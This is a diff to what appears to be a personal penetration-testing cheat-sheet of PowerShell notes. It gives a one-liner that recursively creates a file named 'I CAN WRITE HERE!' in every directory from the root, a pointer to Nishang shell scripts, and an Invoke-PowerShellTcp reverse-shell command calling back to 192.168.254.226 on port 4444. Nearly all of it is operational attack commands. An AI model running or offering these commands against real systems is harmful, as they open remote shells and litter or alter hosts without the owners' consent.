@@ -9,8 +9,20 @@ https://medium.com/swlh/fun-with-powershell-payload-execution-and-evasion-f5051f
 
 
 
-
 - ---] Enumeration
 =====================
+
 # Can you write here?
 cd / ;Get-ChildItem -Recurse -Directory | ForEach-Object {New-Item -ItemType file -Path "$($_.FullName)" -Name "I CAN WRITE HERE!" }
+
+
+- ---] Nishang
+=====================
+
+# Powershell shells location
+/usr/share/windows-resources/nishang/Shells
+
+# Reverse shell
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+
+
